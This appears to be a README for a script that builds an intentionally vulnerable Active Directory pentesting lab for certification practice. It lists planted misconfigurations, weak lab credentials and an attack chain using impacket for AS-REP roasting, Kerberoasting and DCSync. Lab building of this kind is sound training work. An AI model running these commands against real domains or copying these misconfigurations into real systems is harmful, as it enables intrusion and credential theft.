AD Pentesting Lab - Automated Setup
Overview
Automated deployment of an intentionally vulnerable Active Directory environment for penetration testing practice and certification preparation (OSCP, CPTS, CRTP, etc.).

⚠️ WARNING: Creates critical vulnerabilities. Isolated lab environments only.

Requirements
Windows Server with AD Domain Services
Domain Controller role
PowerShell 5.1+ with AD module
Administrator privileges
Quick Start
powershell
# Deploy lab
.\Setup-CPTSLab.ps1

# Cleanup
.\Setup-CPTSLab.ps1 -Cleanup
Post-Install: Reboot the DC for LDAP changes to take effect.

What Gets Deployed
Web Application
Vulnerable IIS app at http://<DC>/portal
SQL injection (login + search)
Unrestricted file upload
Exposed credentials at http://<DC>/backup/config.txt
Guest login: guest / guest123
Domain Users & Attack Vectors
User	Password	Attack Vector
alice.johnson	Alice2024!	AS-REP Roasting
svc-sql	MyS3rviceP@ss!	Kerberoasting → DA
svc-web	WebS3rv1ce!	Kerberoasting + Delegation
john.doe	Welcome2024!	DCSync rights
webadmin	W3bAdm1n2024!	GPP password → DA
svc-iis	IISService123!	Found in backup config
helpdesk	Help2024!	Found in backup config
Privilege Escalation Paths
AlwaysInstallElevated (registry)
Unquoted service path
Writable scheduled task
SMB signing disabled
LDAP signing disabled
Nested group membership (SQL Admins → DA)
Constrained delegation (svc-web → DC)
Attack Chain Example
bash
# 1. Enumerate web app
nmap -sV <DC-IP>
curl http://<DC-IP>/backup/config.txt  # Get credentials

# 2. AS-REP Roasting
impacket-GetNPUsers <DOMAIN>/ -usersfile users.txt -dc-ip <DC-IP>

# 3. Kerberoasting
impacket-GetUserSPNs <DOMAIN>/svc-iis:IISService123! -dc-ip <DC-IP> -request

# 4. Crack svc-sql → Member of Domain Admins via SQL Admins group

# 5. Alternative: Find GPP password in SYSVOL
# Result: webadmin (Domain Admin)

# 6. Alternative: DCSync with john.doe
impacket-secretsdump <DOMAIN>/john.doe:Welcome2024!@<DC-IP>

# 7. Domain Admin achieved
Verification Steps
powershell
# Check IIS
Get-Service W3SVC | Start-Service
Invoke-WebRequest -Uri "http://localhost/portal" -UseBasicParsing

# Verify users
Get-ADUser -Filter * | Select Name, SamAccountName

# Check SPNs
Get-ADUser -Filter {ServicePrincipalName -like "*"} -Properties ServicePrincipalName
Flags
C:\inetpub\wwwroot\portal\uploads\flag1.txt
C:\WebBackup\flag2.txt
C:\Users\Administrator\Desktop\flag.txt
Troubleshooting
Web app not accessible:

powershell
iisreset /restart
Start-Service W3SVC
Kerberoasting fails:

powershell
# Verify SPNs exist
Get-ADUser svc-sql -Properties ServicePrincipalName
DCSync not working:

powershell
# Check after reboot, verify permissions
Get-ACL "AD:\$((Get-ADDomain).DistinguishedName)"
Notes
Script auto-detects domain configuration (works on any domain)
LDAP changes require DC reboot
Take VM snapshot before deployment
Use cleanup mode to remove all changes
Network Isolation
Deploy on isolated virtual network only
No production environment access
No internet connectivity recommended
For authorized testing and educational purposes only.

